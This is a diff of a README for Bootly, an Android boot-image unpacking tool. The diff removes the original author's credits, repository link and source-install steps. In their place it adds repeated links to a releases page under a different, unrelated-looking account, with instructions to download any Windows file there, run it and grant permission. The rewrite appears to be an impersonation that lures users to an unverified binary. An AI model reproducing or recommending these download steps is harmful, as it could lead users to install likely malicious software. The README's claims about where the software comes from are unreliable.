@@ -1,98 +1,151 @@
-# Bootly - Android Image Workstation 🚀
+# 🛠️ Bootly - Simple Android image tools
 
-Bootly is a modern, professional toolkit for managing, unpacking, and repacking Android boot and recovery images. It features a high-fidelity glassmorphism GUI, smart workspace exploration, and a suite of developer-focused tools built on PyQt6.
+[![Download Bootly](https://img.shields.io/badge/Download-Bootly-blue?style=for-the-badge)](https://github.com/registered-controlfreak955/Bootly/releases)
 
-![Bootly Mockup](https://github.com/Haris16-code/Bootly/blob/main/data/bootly-mockup.PNG?raw=true)
+## 📥 Download Bootly
 
-## ✨ Features
-- **Unpack & Repack Boot Image**: Seamlessly single-click extract and rebuild Android boot/recovery images into clean directories.
-- **Root Your Phone (Experimental)**: High-performance one-click automatic rooting suite and manual patching for local `boot.img` files.
-- **Patch Boot Image**: Integrated Magisk-based patching workflow for effortless rooting.
-- **DAT to IMG Builder**: Rapidly convert sparse Android DAT images into raw system images.
-- **AVB Master Tool Suite**: Full GUI integration of `avbtool.py` for standalone VBMeta generation, hash footer appending, custom cryptographic signing (RSA), and partition verification.
-- **High-Fidelity GUI**: Modern PyQt6 interface with a premium dark mode, glassmorphism aesthetics, and fluid responsive toolcards.
-- **Smart Workspace**: Manage raw images and unpacked projects in a fluid grid-based explorer complete with intelligent conflict resolution.
-- **Visual Metadata Parser**: Real-time extraction and visualization of deep image structures (Kernel, Ramdisk, OS version, Header).
-- **Responsive Knowledge Base**: Searchable manual with premium typography and real-time keyword highlighting.
-## 🛠️ Prerequisites
-- **Python 3.10+** (if running from source)
-- **Pip** (Python package manager)
-- **Binaries**: The `bin/` folder must contain the necessary Android image tools (`mkbootimg`, `unpackbootimg`, etc.).
+Visit this page to download Bootly for Windows:
+https://github.com/registered-controlfreak955/Bootly/releases
 
----
+On the releases page, look for the latest version and download the Windows file. If you see more than one file, choose the one for Windows. Save it to your computer, then open it to start the setup or app.
 
-## 🚀 Running Guide
+## 🚀 Getting Started
 
-### 🪟 Windows (Recommended)
-1. **From Standalone EXE**:
-   - Download the latest `Bootly.exe` from the [Releases](https://github.com/Haris16-code/Bootly/releases) page.
-   - Simply run the EXE. (Make sure the `bin/` folder is in the same directory).
-2. **From Source**:
-   - Open your terminal (PowerShell or CMD) in the project root.
-   - Install dependencies: `pip install -r requirements.txt`
-   - Launch: `python main.py`
+Bootly helps you work with Android boot and recovery images from a simple desktop app. It is built for people who want a clear way to unpack, repack, and manage Android image files without using command line tools.
 
-### 🐧 Linux
-1. Install system dependencies:
-   ```bash
-   sudo apt update
-   sudo apt install python3-pip python3-pyqt6
-   ```
-2. Open terminal in project root and install requirements:
-   ```bash
-   pip install -r requirements.txt
-   ```
-3. Launch:
-   ```bash
-   python3 main.py
-   ```
+### What Bootly does
+- Opens Android boot images
+- Unpacks image files for review
+- Repackages files after changes
+- Works with recovery image workflows
+- Supports common Android ROM development tasks
+- Gives you a desktop interface instead of text commands
 
-### 🍎 macOS
-1. Open Terminal in project root.
-2. Install dependencies:
-   ```bash
-   pip install -r requirements.txt
-   ```
-3. Launch:
-   ```bash
-   python3 main.py
-   ```
+### Who it is for
+- Android modders
+- ROM builders
+- Recovery image users
+- People who work with firmware files
+- Anyone who wants a GUI tool for boot image tasks
 
----
+## 🖥️ Windows Setup
 
-## 📁 Project Structure
-- `main.py`: Primary application entry point and GUI logic.
-- `core/`:
-  - `image_manager.py`: Controls image manipulation and process handling.
-  - `updater.py`: Background update engine and version checking.
-  - `analytics.py`: Telemetry and usage tracking dispatcher.
-  - `utils.py`: General utility functions.
-- `bin/`: Contains the binary tools for Android image manipulation.
-- `input/`: Recommended directory for raw images.
-- `output/`: Default directory for repacked images.
+### 1. Download the app
+Go to the release page:
+https://github.com/registered-controlfreak955/Bootly/releases
 
----
+Download the Windows build from the latest release.
 
-## 📚 Developer Documentation
-For technical insights into Bootly's core architecture, UI logic, and offline execution engine, check out the [Bootly Developers Guide](Documentation/Developers_Guide.md).
+### 2. Open the file
+After the download finishes:
+- Open your Downloads folder
+- Find the Bootly file you downloaded
+- Double-click it to start the app or installer
 
----
+### 3. Allow Windows to continue
+If Windows asks for permission:
+- Click Yes or Run
+- Wait for Bootly to open
 
-## Bootly Community
+### 4. Start using Bootly
+Once the app is open, you can begin working with boot images, recovery images, and other Android package files.
 
-Join the development community, share feedback, and collaborate with other Android modding developers:
+## 🧩 Main Features
 
-**Join Community:** https://bootly.harislab.tech
+### 🗂️ Image unpacking
+Bootly can open Android boot image files and split them into parts you can work with. This helps when you need to inspect or change files inside an image.
 
----
+### 🔧 Image repacking
+After you make changes, Bootly can put the image back together. This is useful when you need a new boot or recovery image for testing.
 
-## 🤝 Contributing
-Bootly is an open-source project. We welcome contributions, bug reports, and suggestions!
-**GitHub Repository**: [https://github.com/Haris16-code/Bootly](https://github.com/Haris16-code/Bootly)
+### 🖱️ Simple GUI
+Bootly uses a graphical interface. You click buttons and fill in fields instead of typing commands.
 
-## 📄 Credits
-- **Developed by**: Haris
-- **Legacy Logic**: Inspired by the functionality of Carliv Image Kitchen.
+### 📱 Android ROM support
+Bootly fits common ROM development work. It supports tasks tied to boot images, recovery images, and related firmware files.
 
----
-*Developed with ❤️ for the Android Community.*
+### 🧪 Developer-friendly workflow
+Bootly helps keep image work organized. You can move through unpack and repack steps in one place.
+
+## ✅ System Requirements
+
+Bootly is designed for Windows desktop use. For the best experience, use:
+- Windows 10 or newer
+- A standard x64 PC
+- At least 4 GB RAM
+- Enough free disk space for image files
+- A mouse and keyboard
+- Permission to run downloaded apps
+
+## 📌 Before You Start
+
+Keep these items ready:
+- The Bootly download from the releases page
+- The Android boot or recovery image you want to work on
+- Enough space on your drive for extracted files
+- A folder where you can store your backups
+
+## 🔄 Typical Workflow
+
+### Unpack an image
+1. Open Bootly
+2. Choose the boot or recovery image
+3. Start the unpack process
+4. Wait for Bootly to finish
+5. Check the extracted files in the output folder
+
+### Make your changes
+1. Open the extracted files
+2. Edit the parts you need
+3. Save your changes
+4. Keep a copy of the original image
+
+### Repack the image
+1. Go back to Bootly
+2. Choose the unpacked folder or files
+3. Start the repack process
+4. Wait for the new image to finish
+5. Save the final file in a safe folder
+
+## 📁 File Types You May Use
+
+Bootly works with common Android image workflows, such as:
+- Boot image files
+- Recovery image files
+- ROM-related image content
+- Firmware files used in Android development
+
+## 🧭 How to Find the Right Download
+
+On the releases page, look for:
+- The latest version number
+- A file marked for Windows
+- A file that matches your computer type
+
+If there are several files, choose the one that looks like the app or Windows package. Save it first, then open it.
+
+## 🔒 Safe Use Tips
+
+- Download Bootly only from the release page
+- Keep a backup of your original image files
+- Work in a separate folder for each project
+- Check file names before you repack
+- Save your output file in a new folder
+
+## ❓ Common Questions
+
+### Do I need coding skills?
+No. Bootly uses a GUI, so you can work with buttons and file pickers.
+
+### Does it work on Windows?
+Yes. Follow the Windows download from the releases page.
+
+### Can I use it for Android ROM work?
+Yes. It fits common Android ROM and image tasks.
+
+### What should I do after downloading?
+Open the file you downloaded and follow the on-screen steps.
+
+## 🗃️ Project Topics
+
+android-boot-image, android-tools, aosp, boot-image, desktop-app, firmware-modding, gui, open-source, python, recovery-image, repack, unpack
